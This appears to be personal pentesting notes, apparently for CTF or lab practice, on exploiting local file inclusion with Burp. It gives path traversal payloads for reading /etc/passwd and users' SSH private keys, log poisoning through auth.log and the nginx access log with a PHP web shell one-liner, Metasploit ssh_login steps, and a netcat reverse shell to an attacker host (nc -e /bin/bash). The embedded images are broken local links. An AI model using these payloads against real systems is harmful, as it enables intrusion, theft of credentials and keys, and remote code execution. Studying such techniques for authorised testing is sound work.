**LFI with burp**

<H3>LFI passwd</H3>
`../../../../../../etc/passwd`

![file:///tmp/.9CYK32/1.png](file:///tmp/.9CYK32/1.png)


<H3>LFI user ssh keys</H3>
`../../../../../../home/<user>/.ssh/id_rsa`

![file:///tmp/.9CYK32/1.png](file:///tmp/.9CYK32/1.png)


<h3>auth.log poisoning</h3>
`keyword=../../../../../../../etc/passwd`
`keyword=../../../../../../../etc/var/log/auth.log` **(look for SSH logs)

username:
`<?php system($_GET["cmd"]); ?>`
password: `anything`

<h5>msfconsole</h5>
1. name:ssh type:auxiliary
2. use auxiliary/scanner/ssh/ssh_login
3. name:ssh type:auxiliary
4. use auxiliary/scanner/ssh/ssh_login

<h5>to confirm:</h5>
then input these on address bar
`param?=../../../../../../../etc/var/log/auth.log&cmd=which python3`
<h5>inject to parameter</h5>
1. setup listener first
2. pentest monkey python3 reverse shell
3. spawn tty shell:
4. python3 -c ‘import pty;pty.spawn("/bin/bash")’


<h3>LFI auth log</h3>
can be use to exploit **log poisoning 
`../../../../../../var/log/auth.log`

![file:///tmp/.9CYK32/1.png](file:///tmp/.9CYK32/1.png)


<h3>nginx access log</h3>
can be use to exploit **nginx access log poisoning
`../../../../../../var/log/nginx/access.log`

<h5>check LFI</h5>
`../../../../../../var/log/nginx/access.log`![file:///tmp/.9CYK32/1.png](file:///tmp/.9CYK32/1.png)

1. go to inspector
2. change user header
3. insert php 1 liner in user header value `<?php system ( ‘nc -e /bin/bash <lhost> <lport>’): ?>`
4. save changes
5. setup listener
6. forward (with LFI payload)

![file:///tmp/.9CYK32/1.png](file:///tmp/.9CYK32/1.png)


